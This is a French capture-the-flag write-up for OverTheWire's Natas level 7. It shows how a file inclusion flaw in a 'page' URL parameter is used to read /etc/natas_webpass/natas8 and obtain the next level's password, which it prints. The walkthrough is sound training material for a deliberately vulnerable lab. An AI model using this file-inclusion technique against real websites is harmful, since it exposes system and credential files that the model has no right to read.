## Over-The-Wire -writeup-
### Natas7 (http://natas7.natas.labs.overthewire.org/)

---
#### Etape 1

On observe le code source (Ctrl+U) et on trouve un commentaire:
> <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

Il y aurait une faille pour piocher des fichiers dans les disques distants.  
L'URL du site se compose comme ceci:
> http://natas7.natas.labs.overthewire.org/index.php?page=home //pour la page *home*
> http://natas7.natas.labs.overthewire.org/index.php?page=about //pour la page *about*

Et si on demandait la page kebab à l'index.php ?

---
#### Etape 1

Demandons donc la page kebab:
> http://natas7.natas.labs.overthewire.org/index.php?page=kebab //renvoie des indices

On a ces erreurs qui sont venues se rajouter dans l'HTML:
```html
<b>Warning</b>:  include(kebab): failed to open stream: No such file or directory in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'kebab' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/natas/natas7/index.php</b> on line <b>21</b><br />
```

index.php fait appel au fichier kebab depuis son propre répertoire: `/var/www/natas/natas7/index.php`

---
#### Etape 3

Essayons d'appeler la page index.html avec son chemin absolu en rentrant `/var/www/natas/natas7/index.php` à la place de *home* ou *about*

Une boucle infinie est appelée, mais le fichier index.html est bien appelé par la requête qu'on vient d'envoyer !

---
#### Etape 4

Il suffit maintenant de remplacer le chemin d'index.html par le chemin donné par l'indice: **/etc/natas_webpass/natas8**

> http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

Le HTML renvoie maintenant le code `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

---
Mot de passe: **DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**
